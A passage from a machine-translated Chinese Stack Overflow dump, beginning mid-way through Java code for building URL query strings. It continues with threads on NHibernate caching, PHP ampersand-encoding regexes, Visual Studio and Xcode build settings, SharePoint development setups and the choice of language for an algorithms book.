    for (Entry<String, String> pair : data.entrySet()) {
        builder.addQueryParameter(pair.getKey(), pair.getValue());
    }
    return builder.encode("UTF-8");
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-06-12T14:01:06.410

PHP http_build_query 函数的真正强大之处在于它能够获取关联数组并将其转换为 URL 字符串。下面的代码做类似的事情，它允许将 url 参数构造为包括嵌套 Map 和 Collections 的多级 Map。通过更多工作，还可以添加对 Array 的支持。

测试方法如下所示。

```
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.*;

 /**
 * Class: URLBuilder
 * User: Gilad Tiram
 * Date: 6/12/13
 * Time: 4:02 PM
 * <p/>
 * <p/>
 * Utility that helps to build URL String
 */
 public class URLBuilder {

/**
 * Build URL string from Map of params. Nested Map and Collection is also supported
 *
 * @param params   Map of params for constructing the URL Query String
 * @param encoding encoding type. If not set the "UTF-8" is selected by default
 * @return String of type key=value&...key=value
 * @throws java.io.UnsupportedEncodingException
 *          if encoding isnot supported
 */
public static String httpBuildQuery(Map<String, Object> params, String encoding) {
    if (isEmpty(encoding)) {
        encoding = "UTF-8";
    }
    StringBuilder sb = new StringBuilder();
    for (Map.Entry<String, Object> entry : params.entrySet()) {
        if (sb.length() > 0) {
            sb.append('&');
        }

        String name = entry.getKey();
        Object value = entry.getValue();

        if (value instanceof Map) {
            List<String> baseParam = new ArrayList<String>();
            baseParam.add(name);
            String str = buildUrlFromMap(baseParam, (Map) value, encoding);
            sb.append(str);

        } else if (value instanceof Collection) {
            List<String> baseParam = new ArrayList<String>();
            baseParam.add(name);
            String str = buildUrlFromCollection(baseParam, (Collection) value, encoding);
            sb.append(str);

        } else {
            sb.append(encodeParam(name));
            sb.append("=");
            sb.append(encodeParam(value));
        }

    }
    return sb.toString();
}

private static String buildUrlFromMap(List<String> baseParam, Map<Object, Object> map, String encoding) {
    StringBuilder sb = new StringBuilder();
    String token;

    //Build string of first level - related with params of provided Map
    for (Map.Entry<Object, Object> entry : map.entrySet()) {

        if (sb.length() > 0) {
            sb.append('&');
        }

        String name = String.valueOf(entry.getKey());
        Object value = entry.getValue();
        if (value instanceof Map) {
            List<String> baseParam2 = new ArrayList<String>(baseParam);
            baseParam2.add(name);
            String str = buildUrlFromMap(baseParam2, (Map) value, encoding);
            sb.append(str);

        } else if (value instanceof List) {
            List<String> baseParam2 = new ArrayList<String>(baseParam);
            baseParam2.add(name);
            String str = buildUrlFromCollection(baseParam2, (List) value, encoding);
            sb.append(str);
        } else {
            token = getBaseParamString(baseParam) + "[" + name + "]=" + encodeParam(value);
            sb.append(token);
        }
    }

    return sb.toString();
}

private static String buildUrlFromCollection(List<String> baseParam, Collection coll, String encoding) {
    StringBuilder sb = new StringBuilder();
    String token;
    if (!(coll instanceof List)) {
        coll = new ArrayList(coll);
    }
    List arrColl = (List) coll;

    //Build string of first level - related with params of provided Map
    for (int i = 0; i < arrColl.size(); i++) {

        if (sb.length() > 0) {
            sb.append('&');
        }

        Object value = (Object) arrColl.get(i);
        if (value instanceof Map) {
            List<String> baseParam2 = new ArrayList<String>(baseParam);
            baseParam2.add(String.valueOf(i));
            String str = buildUrlFromMap(baseParam2, (Map) value, encoding);
            sb.append(str);

        } else if (value instanceof List) {
            List<String> baseParam2 = new ArrayList<String>(baseParam);
            baseParam2.add(String.valueOf(i));
            String str = buildUrlFromCollection(baseParam2, (List) value, encoding);
            sb.append(str);
        } else {
            token = getBaseParamString(baseParam) + "[" + i + "]=" + encodeParam(value);
            sb.append(token);
        }
    }

    return sb.toString();
}

private static String getBaseParamString(List<String> baseParam) {
    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < baseParam.size(); i++) {
        String s = baseParam.get(i);
        if (i == 0) {
            sb.append(s);
        } else {
            sb.append("[" + s + "]");
        }
    }
    return sb.toString();
}

/**
 * Check if String is either empty or null
 *
 * @param str string to check
 * @return true if string is empty. Else return false
 */
public static boolean isEmpty(String str) {
    return str == null || str.length() == 0;
}

private static String encodeParam(Object param) {
    try {
        return URLEncoder.encode(String.valueOf(param), "UTF-8");
    } catch (UnsupportedEncodingException e) {
        return URLEncoder.encode(String.valueOf(param));
    }
}

/* ========================================================================= */
/* Test functions                                                            */
/* ========================================================================= */

public static void main(String[] args) {
    //basicTest();
    //testWithMap();
    //testWithList();
    //testWithNestedMap();
    //testWithNestedList();
    testCompound();
}

private static void basicTest() {
    Map<String, Object> params = new LinkedHashMap<String, Object>();
    params.put("a", "1");
    params.put("b", "2");
    params.put("c", "3");

    System.out.println(httpBuildQuery(params, "UTF-8"));
}

private static void testWithMap() {
    Map<String, Object> params = new LinkedHashMap<String, Object>();
    params.put("a", "1");
    params.put("b", "2");

    Map<String, Object> cParams = new LinkedHashMap<String, Object>();
    cParams.put("c1", "c1val");
    cParams.put("c2", "c2val");
    params.put("c", cParams);

    System.out.println(httpBuildQuery(params, "UTF-8"));
}

private static void testWithNestedMap() {
    Map<String, Object> params = new LinkedHashMap<String, Object>();
    params.put("a", "1");
    params.put("b", "2");

    Map<String, Object> cParamsLevel1 = new LinkedHashMap<String, Object>();
    cParamsLevel1.put("cL1-1", "cLevel1-1val");
    cParamsLevel1.put("cL1-2", "cLevel1-2val");

    Map<String, Object> cParamsLevel2 = new LinkedHashMap<String, Object>();
    cParamsLevel2.put("cL2-1", "cLevel2-1val");
    cParamsLevel2.put("cL2-2", "cLevel2-2val");
    cParamsLevel1.put("cL1-3", cParamsLevel2);

    params.put("c", cParamsLevel1);

    System.out.println(httpBuildQuery(params, "UTF-8"));
}

private static void testWithList() {
    Map<String, Object> params = new LinkedHashMap<String, Object>();
    params.put("a", "1");
    params.put("b", "2");

    List<Object> cParams = new ArrayList<Object>();
    cParams.add("c1val");
    cParams.add("c2val");
    params.put("c", cParams);

    System.out.println(httpBuildQuery(params, "UTF-8"));
}

private static void testWithNestedList() {
    Map<String, Object> params = new LinkedHashMap<String, Object>();
    params.put("a", "1");
    params.put("b", "2");

    List<Object> cParamsLevel1 = new ArrayList<Object>();
    cParamsLevel1.add("cL1-val1");
    cParamsLevel1.add("cL12-val2");

    List<Object> cParamsLevel2 = new ArrayList<Object>();
    cParamsLevel2.add("cL2-val1");
    cParamsLevel2.add("cL2-val2");
    cParamsLevel1.add(cParamsLevel2);

    params.put("c", cParamsLevel1);

    System.out.println(httpBuildQuery(params, "UTF-8"));
}

private static void testCompound() {

    Map<String, Object> params = new LinkedHashMap<String, Object>();

    //flat
    params.put("a", "1");
    params.put("b", "2");

    //Map level 1
    Map<String, Object> cParamsLevel1 = new LinkedHashMap<String, Object>();
    cParamsLevel1.put("cL1-1", "cLevel1-1val");
    cParamsLevel1.put("cL1-2", "cLevel1-2val");

    //Map level 2
    Map<String, Object> cParamsLevel2 = new LinkedHashMap<String, Object>();
    cParamsLevel2.put("cL2-1", "cLevel2-1val");
    cParamsLevel2.put("cL2-2", "cLevel2-2val");
    cParamsLevel1.put("cL1-3", cParamsLevel2);

    params.put("c", cParamsLevel1);

    //List level 1
    List<Object> dParamsLevel1 = new ArrayList<Object>();
    dParamsLevel1.add("dL1-val1");
    dParamsLevel1.add("dL12-val2");

    //List level 2
    List<Object> dParamsLevel2 = new ArrayList<Object>();
    dParamsLevel2.add("dL2-val1");
    dParamsLevel2.add("dL2-val2");
    dParamsLevel1.add(dParamsLevel2);

    params.put("d", dParamsLevel1);

    System.out.println(httpBuildQuery(params, "UTF-8"));

}

} 
```

为了轻松测试您的结果，请将测试结果的字符串附加为指向此 PHP 的真实 url 的查询字符串。例子

```
http://localhost/test.php?a=1&b=2&c[cL1-1]=cLevel1-1val&c[cL1-2]=cLevel1-2val&c[cL1-3][cL2-1]=cLevel2-1val&c[cL1- 3][cL2-2]=cLevel2-2val&d[0]=dL1-val1&d[1]=dL12-val2&d[2][0]=dL2-val1&d[2][1]=dL2-val2

```

```
<?php
var_dump($_REQUEST);
?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-22T14:30:38.247

您可能希望在强制使用 UTF-8 之前检查客户端支持的编码的“接受”请求标头（即使它可能是最佳选择）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-02-19T05:36:27.720

这应该是最简单（也是最可靠）的解决方案：

```
protected static String httpBuildQuery(List<? extends NameValuePair> parameters, String encoding) {
    return URLEncodedUtils.format(parameters, encoding).replace("*", "%2A");
} 
```

示例用法：

```
List<NameValuePair> params = new ArrayList<NameValuePair>;
params.add(new BasicNameValuePair("key", "value"));

String queryString = httpBuildQuery(myParamList, "UTF-8"); 
```

Java not encoding the asterisk (`+`) while PHP does encode it `%2A` should be the only difference.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-11T23:40:53.337

看起来不错，但有以下注意事项：

*   使参数 a`Map<String, String>`而不是将键和值转换为字符串。
*   硬编码的编码看起来很可疑。UTF-8 不是给定的，它必须匹配 HTTP 请求标头中定义的编码。因此，代码应该确保它们确实如此——至少在某处将其定义为常量，并在此处和设置请求编码的任何位置引用它。

**编辑：**似乎我对编码有误；HTTP GET 参数不受编码标头的约束，并且传统上根本没有明确定义的编码。[RFC 3988](https://www.rfc-editor.org/rfc/rfc3986#section-2.5)似乎确实要求使用 UTF-8，但这对我来说听起来相当脆弱，所以除非你对服务器有严格的控制并且可以确保它确实也使用 UTF-8，否则我会对任何数据使用 POST 请求这不在 7 位 ASCII 范围内。

# asp.net-mvc - 使用 MVC Web 应用程序时，Nhibernate 的最佳缓存是什么？

> ID：636778
> 
> 赞同：8
> 
> 时间：2009-03-11T23:34:33.150
> 
> 标签：asp.net-mvc, nhibernate

如果您在 MVC 应用程序中使用 Nhibernate 进行数据访问，那么最好的缓存提供程序是什么，例如 Syscache、Syscache2、Memcache、HashTable.. 使用？

感谢您的意见。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-10-07T17:49:25.267

HashTable 是默认的内置缓存提供程序。建议*不要*使用这个。

*   SysCache 使用**System.Web.Caching.Cache**作为缓存提供者
*   SysCache2 基本相同，只是它也支持基于 SQL 依赖的过期。它需要 MSSQL 2000+。

在大多数情况下（非 webfarm），**SysCache**提供程序应该足够好。

有关更多信息，请查看[有关 NHibernate.Caches 的文档](https://www.hibernate.org/hib_docs/nhibernate/1.2/reference/en/html/caches.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-12T06:02:36.070

如果您询问 NHibernate 的缓存处理方法，（NHibernate 本身不存储/检索缓存数据，我们需要单独配置缓存提供程序来做到这一点）

由于 Web 应用程序（多线程应用程序）的性质，我们不能使用一级缓存。但是我们可以使用

*   二级缓存
*   查询缓存

在使用缓存时，它可能会显示旧数据，在以下情况下

*   当数据被不同的客户端修改时，（除了 ASP.Net 客户端）
*   当数据被触发器修改时

因此，当存在上述情况时，请确保清除缓存。

* * *

关于缓存提供者，

Nhibernate 支持多个缓存提供程序，Syscache、Syscache2、Memcache、HashTable 等。我使用 Syscache，它工作正常。由于我没有在其他缓存提供程序上工作过，我无法比较它们。

Nhibernate 缓存的旧文档和唯一文档 [http://www.hibernate.org/hib_docs/nhibernate/1.2/reference/en/html/caches.html](http://www.hibernate.org/hib_docs/nhibernate/1.2/reference/en/html/caches.html)

更多文档 [NHibernate 文档的最佳位置？](https://stackoverflow.com/questions/135776/best-place-for-nhibernate-documentation)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2009-03-11T23:50:01.800

最好使用的缓存？你的意思是缓存的类型？还是缓存平台？

有内置的 HttpRuntime.Cache。取决于您的应用程序缓存的内容。

# php - 此正则表达式与尚未编码的 & 符号匹配的任何缺陷

> ID：636781
> 
> 赞同：4
> 
> 时间：2009-03-11T23:35:36.000
> 
> 标签：php, regex

在 PHP 中，我想对尚未编码的 & 符号进行编码。我想出了这个正则表达式

```
/&(?=[^a])/ 
```

到目前为止它似乎运作良好，但鉴于我不是一个正则表达式专家，我想问在这个正则表达式中是否可以看到任何潜在的陷阱？

本质上它需要转换`&`为`&amp;`但`&`​​保持`&amp;`原样（以免得到`&amp;amp;`）

谢谢

## 更新

感谢您的回答。看来我的*思维*不够广泛，无法涵盖所有​​基础。这似乎是正则表达式本身的一个常见缺陷（必须考虑可能使您的正则表达式误报的所有可能性）。它确实打败了我原来的`str_replace(' & ', ' &amp; ', $string);` :)

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-03-11T23:40:22.260

更好的是[否定前瞻断言](http://www.perl.com/doc/manual/html/pod/perlre.html#item__pattern_)来验证 & 后面没有 amp;

```
/&(?!amp;)/ 
```

虽然这会改变用于*其他*实体的任何 & 符号。如果你可能有其他人，那么像这样的东西怎么样

```
/&(?!#?[a-zA-Z0-9]+;)/ 
```

这将寻找一个＆符号，但断言它后面没有可选的哈希符号（对于数字实体）、一系列字母数字和一个分号，它应该涵盖[命名和数字实体](http://www.w3schools.com/tags/ref_entities.asp)，如`&quote;`或`&#170;`

## 测试代码

```
$text="It&rsquo;s 30 &#176; outside & very hot. T-shirt &amp; shorts needed!";

$text=preg_replace('/&(?!#?[a-z0-9]+;)/', '&amp;', $text);

echo "$text\n"; 
```

哪个会输出

```
It&rsquo;s 30 &#176; outside &amp; very hot. T-shirt &amp; shorts needed! 
```

更容易理解为*“外面 30°，非常热。需要 T 恤和短裤！”*

## PHP 5.2.3+ 的替代方案

正如 Ionut G. Stan 在下面指出的那样，从 PHP 5.2.3 开始，您可以使用带有第四个参数*false的*[htmlspecialchars](http://php.net/htmlspecialchars)来防止双重编码，例如

 *```
$text=htmlspecialchars($text,ENT_COMPAT,"UTF-8",false); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T23:40:16.550

它将应用于任何其他编码的字符。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-12T00:02:25.750

如果您的 PHP 版本 >= 5.2.3，您可以使用[htmlspecialchars](http://www.php.net/manual/en/function.htmlspecialchars.php)函数的第四个参数。当设置为 false 时，它​​不会转换现有实体。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-12-21T01:44:24.317

在 Perl 中，这将是：

```
$content =~ s/&(?!\w+;)/&amp;/g; 
```

It uses a negative lookahead of 1 or more word chars, meaning "an ampersand that is not followed by one or more word chars and immediately followed a semicolon. Though the use os the shortcut \w is not as safe as a specific char range for this particular case. A better option would be:

```
$content =~ s/&(?![a-z]+;)/&amp;/g; 
```

And just case you have some uppercase animal in your data:

```
$content =~ s/&(?![a-zA-Z]+;)/&amp;/g; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-11T23:42:28.043

当您的文档中有其他实体时会发生什么？如果您在谈论问答环节会发生什么？

我会隔离＆符号而不是猜测上下文，然后在替换字符串中使用反向引用

```
/(\W)&(\W)/$1&amp;$2/ 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-11T23:44:43.670

如果字符 'a' 跟在 & 符号后面但不是“amp;”，那将失败。喜欢 &and &also &apple...

&(?!amp;)

# visual-studio - Visual Studio 2008 中的外部编辑器

> ID：636797
> 
> 赞同：6
> 
> 时间：2009-03-11T23:42:34.160
> 
> 标签：visual-studio, visual-studio-2008, editor, external

有没有办法为 VS2008 设置外部编辑器集成？

我的意思是当我在解决方案资源管理器中双击 .CPP 文件时，它应该在外部编辑器中打开，而不是在内部 VS 编辑器中打开。

为了简单起见，假设我希望它在记事本++中打开文件（或者记事本如何使它更简单）。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-03-11T23:45:52.310

在解决方案资源管理器中右键单击所需的文件类型，

然后选择打开方式...

选择您的程序，然后选择“设置为默认值”

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-11T23:46:28.627

右键单击任何文件并选择打开方式..

然后单击添加浏览到您选择的该文件类型的程序并将其添加到列表中，选择“设置为默认值”

从现在开始，当您双击此文件类型时，它将在您选择的编辑器中打开。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T23:46:41.060

（在 VS2008 中）

您可以转到：工具 -> 选项 -> 文本编辑器 -> 文件扩展名。放入文件扩展名并选择一个程序来启动它

# c# - VS C# 编译器不会编译引用的引用的情况有哪些？

> ID：636800
> 
> 赞同：1
> 
> 时间：2009-03-11T23:44:21.113
> 
> 标签：c#, visual-studio, build-process, compilation

我可能问错了这个问题（这可能是谷歌没有帮助的原因），但这里是：

在 Visual Studio 中，我正在编译一个 C# 项目（我们称之为项目 A，启动项目），它引用了项目 B。项目 B 引用了项目 C，所以当 A 被构建时，B 的 dll 被放置在 A 的 bin 目录下，C 的 dll 也是如此（因为 B 需要 C，A 需要 B）。但是，我最近显然做了一些更改，以便在重建解决方案时，项目 C 的 dll 不会进入项目 A 的 bin 目录。我不知道我做了什么来实现这一点。

我没有修改解决方案本身的设置，我只是添加了对项目文件的附加引用。代码方面，我已经注释掉了项目 B 中引用项目 C 中的类的大部分实际代码，但没有从项目本身中删除引用（我认为这不重要）。有人告诉我，也许 C# 编译器正在以某种方式进行优化，因此它没有构建 Project C，但我真的没有想法。我认为有人以前遇到过类似的事情

有什么想法吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-12T00:31:37.193

您是否更改了构建配置？在 Visual Studio 2008 中，默认的解决方案配置是调试和发布，而默认的解决方案平台是任何 CPU。我的经验表明解决方案配置/平台对具有独特的构建配置。换句话说，*Debug/Any CPU*和*Release/Any CPU*是两个独立的构建配置，每个都有自己的设置。如果您选择了不同的配置，原始配置的设置不会自动应用；您需要为所有配置以及添加到解决方案的任何新项目设置依赖关系，以便在它们之间无缝切换。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T23:48:04.160

您可以在解决方案资源管理器中右键单击解决方案，然后检查您的项目依赖项。

我的猜测是，不知何故，您已标记 B 不依赖 C。

或者：在解决方案属性中，确保将当前配置设置为构建项目 C。

# flash - 客户端 Flash（swf 文件）可以执行以下操作吗？

> ID：636806
> 
> 赞同：0
> 
> 时间：2009-03-11T23:45:47.943
> 
> 标签：flash, image-manipulation

我需要制作一个简单的 Flash 程序（导出为 swf 以显示在网络浏览器中），允许用户*操作*现有图像，然后将此操作后的图像保存到网络服务器。

客户端闪存程序是否*可以生成*新图像，或者它是否需要将*所有更改*发送回Web 服务器，然后 Web 服务器将在服务器端生成新图像（基于这些更改，通过 POST）？

干杯:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-12T09:27:05.970

您可以做到这一点，Flash 具有简单图像编辑应用程序所需的所有位图操作功能。将图像发回只是一个简单的帖子到服务器的问题。您可能需要先对其进行压缩，因为发送原始数据会很快变得太大。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T23:53:02.997

看看闪存远程处理。结束整个图像可能更容易。

我过去使用过[http://www.fluorinefx.com/](http://www.fluorinefx.com/)。

# c++ - Mac OSX - Xcode 安装目录

> ID：636810
> 
> 赞同：1
> 
> 时间：2009-03-11T23:46:15.400
> 
> 标签：c++, xcode, macos

在 Xcode 完成构建之后，有没有办法让它将可执行文件复制到特定目录

> ~/网站/cgi-bin/

我将目标`Installation Directory`设置为正确的文件夹，`skip installation` **未选中**，但没有运气。

有什么我想念的吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-12T07:28:01.390

检查目标发布配置中的“部署后处理”构建设置。安装通常只使用命令行 xcodebuild install 完成，但设置部署后处理使其安装在每个构建上。

确保您的用户帐户在要安装的目录中具有写入权限，因为 IDE 通常不以 root 权限运行。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T10:51:56.170

在右下角的构建阶段添加构建阶段运行脚本，添加例如 mv -f ${SYMROOT}/debug/projectname ~/Library/ **projectname**

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-25T18:07:54.413

也许更简单的方法是添加“复制文件”构建阶段。将目标设置为“绝对路径”，将子路径设置为您希望将其复制到磁盘上的位置。波浪号扩展和 $HOME 都可以在子路径中使用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-12-11T09:06:43.240

除了设置“安装目录”之外，请确保您还将设置中的 DSTROOT（安装构建制作位置）设置为“/”。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-12-05T08:36:37.410

在遵循构建设置设置后，我对每个构建都进行了安装：

*   设置`Skip Install`为`NO`
*   设置`Deployment Location`为`YES`
*   设置`Installation Build Products Location`为`/`
*   设置`Installation Directory`为`~/Sites/cgi-bin/`

# sharepoint - 您使用什么设置进行 SharePoint (WSS/MOSS) 开发？

> ID：636813
> 
> 赞同：1
> 
> 时间：2009-03-11T23:46:52.510
> 
> 标签：sharepoint, moss, wss

我很想知道其他 SharePoint 开发人员如何设置他们的开发工作站。

我目前的设置：

*   带有 Server 2008 的桌面（仅适用于 Hyper-V，之前使用的是 Vista）
*   在本地计算机上使用 Visual Studio 2008 进行开发工作
    *   保留 SharePoint DLL 的本地副本以供参考，无需本地安装 SharePoint
*   在我的本地计算机上托管的 Server 2003 VM 中运行 SharePoint

我将所有 SharePoint 更改开发为 WSP，并将它们安装到 VM 中进行测试。我不在调试模式下运行代码，但会写很多跟踪语句来观察我的代码在做什么。

此外，当我进行快速更改时，我通常不会重新安装整个 WSP。我只是重新编译我更改的任何 DLL 并将其复制到我的 SharePoint VM 中的 GAC，然后重置 IIS（通常编写 Web 部件）。

我知道如果我在本地运行 SharePoint 会更容易，但我通常一次处理多个项目，并且不希望受到干扰。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-12T01:58:23.490

绝对更喜欢直接在带有 SharePoint 的 VM 中工作，因为我可以正确调试进程，而且我有一个[构建脚本](https://stackoverflow.com/questions/541108/is-it-possible-to-develop-for-sharepoint-using-continuous-integration-techniques/542654#542654)，可以重新部署我的整个解决方案或让我刷新 GAC。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-12T23:24:39.313

我的所有开发工作都是在我的一个 VMware 映像上完成的。由于我尝试以 TDD 样式进行 SharePoint 工作，因此我运行了大量测试，然后远程的东西对我来说毫无意义。

对我帮助最大的一项是 Visual Studio 中的后期构建活动，你可以通过一些脚本来完成所有的事情，这真是太棒了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-12T22:56:52.453

在同一台服务器（物理或虚拟）上运行 SharePoint/VS 将使您快速启动并运行，但我个人认为这不是要走的路。

除了您所描述的（在 VM 中运行的本地 VS/SharePoint）之外，还有一些技巧可以让您的生活更轻松。

1）部署到bin目录而不是GAC，然后更新您所要做的就是在构建后批处理文件中复制您的dll / pdb - 如果它们在GAC中，请不要认为您可以自动执行远程机器可以吗？

2）看看[远程调试](http://msdn.microsoft.com/en-us/library/xf8k2h6a.aspx)——先开始工作可能有点痛苦，但努力是值得的！关键提示是您需要在本地和远程计算机上使用相同的用户名/密码。

此页面相关 - [调试 SharePoint 2007 代码](https://stackoverflow.com/questions/145361/debugging-sharepoint-2007-code/147629)

# algorithm - 算法书籍中编程语言的选择？

> ID：636821
> 
> 赞同：7
> 
> 时间：2009-03-11T23:51:45.027
> 
> 标签：algorithm, programming-languages

继续我之前关于算法书籍的持久属性的问题，请参阅[此处](https://stackoverflow.com/questions/608779/what-are-the-enduring-properties-of-a-book-on-algorithms)，现在我想问社区您会使用哪种语言来编写此类参考书的示例。

我可能不会使用 MMIX (!) 来编写本书的示例，但同时，我认为仅使用伪代码就没有真实语言中的示例那么有趣。

尽管如此，我也希望这本书也能成为研究人员的资源。社区的选择可能是什么？为什么？

**回答**：我知道这是一个棘手的问题，并且会有几个不同的答案。请注意，答案涵盖了从 Assembly/MMIX(!!) 到 Python 和伪代码的整个范围。投票和争论迫使我选择 Uri 的明智答案，但有一个警告：我的伪代码将尽可能接近 C（当然，不涉及平台特定问题），我可能会讨论更好的实现在旁注中（众所周知，从数学上证明算法的工作原理远非实现它的问题）。

这本书是关于特定领域的算法的，而不是关于一般算法的数学的（在一般算法上，聪明的人已经做得比我好得多）。因此，我认为会给这样一本书增加价值的一件事是算法的存储库，我肯定会将其放在一个配套网站上（如果我有时间的话，可能会用几种语言）。

感谢所有的答案。有时我觉得我应该把所有回答的人都列为共同作者。:)

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-03-12T00:08:20.867

一本关于算法的好书应该用伪代码 a-la-CLR 写...

以我的经验，大多数进入特定语言示例的书籍最终看起来更像是本科教科书，而不是一本严肃的参考书或学习书。此外，大多数语言在处理集合时都相当笨拙（尤其是 C++ 和 Java，即使是泛型）。在所有细节之间，丢失了太多。您还立即消除了很多潜在的受众。

特定语言书籍的唯一优势是，如果您正在编写教科书，出版商可以附上一张 CD 并在建议零售价中添加 50 美元。

从（可读的）伪代码中理解算法对我来说更容易。如果我无法弄清楚如何用我自己的集合用我的语言实现它，那么无论如何我都会遇到麻烦。

您可以在每个伪代码中添加有关特定语言实现细节的注释（例如，使用 Java 中的 TreeSet 以获得最佳性能等）

您还可以为这本书维护一个单独的网站（无论如何都是个好主意），在那里您将拥有不同语言的实际实现。无需用长打印输出杀死树木。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-03-12T00:29:52.610

使用真正的编程语言——绝不是伪语言。读者对伪代码非常怀疑，读者喜欢真正的编程语言。伪语言的陷阱是您可以定义读者无法在他们选择的语言中暗示的代码概念

真正的编程语言有很多优点：

1）你可以测试你的代码，希望能证明你的代码是正确的！

2）您可以将该代码导出为已发布的格式以插入您的书中，确保任何跟随您的代码的人都会查看实际的可执行代码。

3）你不必为你的伪代码辩护。

语言的选择显然是主观的，但我认为几乎任何现代语言都可以使用，但我推荐一种在快速理解方面“开销最小”的语言。最好是读者可以获得编译器/解释器。如果您想使用 C，那么也许您应该查看 D。一个改进的 C。

例如，如果您保持代码“简单”，Ruby 就是这样，Java 不是（需要太多的支持库），在较早的时候 Pascal 将是一个候选者。

顺便说一句：我现在不使用 Ruby，因为我目前使用的是 Smalltalk 和 REBOL，但我不会在书中使用这两种语言。你的书会直接进入剩余的垃圾箱！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-12T00:05:45.523

我会避免任何抽象任何特定算法的核心“机制”的东西

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-03-12T01:15:26.230

Knuth 用汇编语言渲染算法有一个巨大的好处。当我们用某种高级语言编写算法时，它迫使读者仔细考虑芯片中到底发生了什么。尤其是对于系统程序员来说，这种理解是无法通过其他方式获得的。

Knuth 的新 MMIX 是理想的：将其视为汇编级伪代码。

我理想的教科书应该有用伪代码和 MMIX 编写的算法，这样我们就可以看到算法的漂亮和血腥复杂的形式。伪代码应该比“真正的语言”更受欢迎，因为它回避了毫无意义的“你应该使用这种语言而不是那种语言”的战斗。在这个阶段，伪代码不需要辩护——现存最好的算法教科书要么使用伪代码，要么在 Knuth 的案例中使用一种汇编伪代码。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-03-12T02:46:51.907

选择将无法取悦所有人。

[Robert Sedgewick以多种语言](http://www.amazon.com/s/ref=nb_ss_b?url=search-alias%3Dstripbooks&field-keywords=Robert+Sedgewick&x=0&y=0)编写了他的“...中的算法”书籍。当我开始在工作中使用 C++ 时，我有 C 版本的课程并购买了 C++ 版本。

您无法逃避语言功能（甚至是伪语言功能）。

为了取悦尽可能多的人，您可以选择两种语言，一种是实用的，一种不是。它可以帮助说明算法选择的动机。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-03-12T00:01:19.950

我不会使用任何特定的语言。使用对大多数做过一点编程的人来说都清楚的伪语言。通常这些书使用接近 C 风格的东西，但这不是规则。我知道您提到您不想使用伪代码，但这将使您接触到更广泛的受众。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-03-12T00:07:04.053

经常使用 C 风格，因为许多语言使用非常相似的风格，因此大多数程序员无需解释即可理解它。此外，示例可以在任何带有 C 编译器的机器上运行——几乎是每台机器。

然而，更高层次的概念通常需要使用更新的技术和技巧——OO、函数式编程等。

这些通常以具有所需功能的语言表示。Java、C#、Erlang、Ada 等——大多数优秀的程序员只需稍加解释就能掌握发生了什么。

但是 C 几乎是一个通用的基础——如果你采用 C 风格作为例子，你真的不会出错。

-亚当

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-03-12T00:40:36.687

我会使用一些可以让你准确表达算法背后的想法的东西。

Haskell 非常简洁，但我认为使用与状态一起工作的算法，它可能会妨碍您，并且您会更专注于语言而不是算法。

我不会使用 C 或其后代（C++、C#、Java ...），因为当您的算法在本质上更具“功能性”时，它们会妨碍您。同样，您会更专注于语言而不是算法。如果我不得不在没有高阶函数的情况下工作，我会感到非常不舒服。

所以，基本上，我会使用一种你熟悉的多范式语言，并且你有信心使用它来表达算法，而无需深入研究语言细节。

我个人的选择是 Common Lisp，但也许 Python 或 Scala 也是可行的。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-03-12T01:04:45.820

Python 是一个很好的选择。它的可读性很强，即使你以前没有在里面编程过。另外，它比其他一些常见的语言选择要简洁得多。

# browser - 停止浏览器强制表单元素进入窗口视图

> ID：636822
> 
> 赞同：0
> 
> 时间：2009-03-11T23:51:52.857
> 
> 标签：browser, focus, field

任何想法如何阻止浏览器在隐藏溢出时强制聚焦表单字段进入视图？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-12T01:33:24.050

如何将违规字段移出页面（位置：绝对；顶部：-9999；）？这将使它消失。

如果您希望该字段出现在您最初放置它的位置，但是您可以拥有一组虚拟字段（从顶部的页面中删除：-9999）并在用户浏览表单时将焦点转移到它们。如果您在更改虚拟字段时更新视图中的字段，那么您可以给人一种用户正在操纵可见表单的印象。

# c++ - C/C++ 中 void main 和 int main 的区别？

> ID：636829
> 
> 赞同：58
> 
> 时间：2009-03-11T23:53:49.843
> 
> 标签：c++, c, function, standards, main

`main`我在 C++（或 C）程序中声明函数的方式有关系吗？

* * *

